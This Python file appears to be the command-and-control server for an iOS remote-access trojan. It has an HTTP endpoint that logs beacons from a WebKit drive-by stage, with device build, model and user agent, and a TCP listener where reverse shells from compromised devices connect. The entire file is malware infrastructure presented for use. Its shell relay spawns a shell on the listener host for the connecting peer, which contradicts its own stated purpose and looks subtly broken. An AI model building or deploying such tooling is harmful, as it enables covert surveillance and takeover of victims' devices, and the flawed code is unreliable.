"""
C2 / reverse-shell listener for the RAT.

Two legs share this server:
  * Beacon  (HTTP)   — stage-1 WebKit browser callbacks (GET /bee?...).
  * Shell   (TCP)    — kernel-stage reverse shell that runs a real POSIX shell.

Keep it small, quiet, and non-destructive. No hardcoded secrets.

The shell leg is a real bidirectional relay: a reverse shell from the device
connects back to :port+1, we spawn a local /bin/sh for it, and relay bytes
both ways with select() so it behaves like a normal interactive shell.
"""
from __future__ import annotations
import os
import pty
import select
import socket
import socketserver
import subprocess
import threading
import http.server
import argparse
import sys
import time
import urllib.parse


# --- beacon (HTTP) ---------------------------------------------------------- #
class BeaconHTTPServer(http.server.BaseHTTPRequestHandler):
    hub: "C2Server" = None

    def _beacon(self):
        query = urllib.parse.urlparse(self.path).query
        params = dict(p.split("=", 1) for p in query.split("&") if "=" in p)
        # UA leaks on a browser drive-by — real device recon, no device pairing.
        params.setdefault("ua", self.headers.get("User-Agent", "?"))
        self.hub.on_beacon(params, self.client_address)

    def do_GET(self):
        if self.path.startswith("/bee"):
            self._beacon()
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):  # quiet
        pass


class ShellServer(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class C2Server:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.beacons = []
        self._shell_servers = []
        self.shells = {}          # id -> {"peer", "created", "proc"}
        self._shell_counter = 0
        self._lock = threading.Lock()

    def on_beacon(self, params, addr):
        self.beacons.append({"addr": addr, "params": params})
        p = params
        print(f"[c2] beacon from {addr[0]}:{addr[1]}  "
              f"build={p.get('build','?')} model={p.get('m','?')} ua={p.get('ua','?')[:70]}")

    def start_servers(self) -> "C2Server":
        """Start the beacon + shell listeners in background threads (non-blocking)."""
        httpd = http.server.ThreadingHTTPServer(
            (self.host, self.port), BeaconHTTPServer)
        BeaconHTTPServer.hub = self
        self._httpd = httpd
        # Non-daemon: the listeners keep the process alive while serving.
        self._http_thread = threading.Thread(
            target=httpd.serve_forever, name="beacon", daemon=False)
        self._http_thread.start()
        print(f"[c2] beacon HTTP on http://{self.host}:{self.port}/bee")
        self._run_shell_listener()
        return self

    def _run_shell_listener(self):
        s = ShellServer((self.host, self.port + 1), _ShellHandler)
        _ShellHandler.c2 = self      # bind handler CLASS so per-conn instances resolve it
        self._shell_servers.append(s)
        t = threading.Thread(target=s.serve_forever, name="shell", daemon=False)
        t.start()
        print(f"[c2] shell TCP on {self.host}:{self.port + 1} "
              "(target reverse-shell lands here)")

    def add_shell(self, peer: tuple, proc: subprocess.Popen) -> int:
        with self._lock:
            sid = self._shell_counter
            self._shell_counter += 1
            self.shells[sid] = {"peer": peer, "created": time.time(), "proc": proc}
        return sid

    def shell_servers(self):
        return list(self._shell_servers)

    def run(self, interactive: bool = True):
        self.start_servers()
        if not interactive:
            return
        try:
            threading.Event().wait(3600)
        except KeyboardInterrupt:
            self._httpd.shutdown()


class _ShellHandler(socketserver.BaseRequestHandler):
    c2: C2Server = None

    def handle(self):
        sock = self.request
        peer = self.client_address[0]
        # Spawn a local shell for the back-doored device, behind a PTY so the
        # shell is interactive/line-buffered (a pipe-less shell would buffer).
        shell_cmd = os.environ.get("RAT_SHELL", "/bin/sh")
        try:
            master_fd, slave_fd = pty.openpty()
            proc = subprocess.Popen(
                [shell_cmd], stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
                close_fds=True, start_new_session=True,
                 env={**os.environ, "PS1": "$ rat # "})
            # Parent drives the master end (reads shell output, writes shell
            # input); the child keeps its own slave copy as stdin/stdout/stderr.
            os.close(slave_fd)
        except Exception as e:
            sock.sendall(("shell spawn failed: %s\n" % e).encode())
            try:
                os.close(master_fd)
            except Exception:
                pass
            sock.close()
            return
        sid = self.c2.add_shell(peer, proc)
        print(f"[c2] shell session #{sid} from {peer} (RAT_SHELL={shell_cmd})")

        # Single select loop multiplexing socket <-> PTY. Writing to master_fd
        # is the child's stdin; reading master_fd is the child's stdout. When
        # the shell exits it closes its slave end -> master read returns EIO.
        while True:
            r, _, _ = select.select([sock, master_fd], [], [], 0.1)
            if sock in r:
                try:
                    data = sock.recv(4096)
                except OSError:
                    break
                if not data:
                    proc.kill()      # client disconnected: stop the shell
                    break
                os.write(master_fd, data)
            if master_fd in r:
                try:
                    chunk = os.read(master_fd, 4096)
                except OSError:
                    break
                if not chunk:
                    break
                sock.sendall(chunk)
        try:
            os.close(master_fd)
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass


def main():
    p = argparse.ArgumentParser(description="iOS RAT C2 listener")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=4444)
    p.add_argument("--no-shell", action="store_true")
    args = p.parse_args()
    C2Server(args.host, args.port).run(interactive=not args.no_shell)


if __name__ == "__main__":
    sys.exit(main())
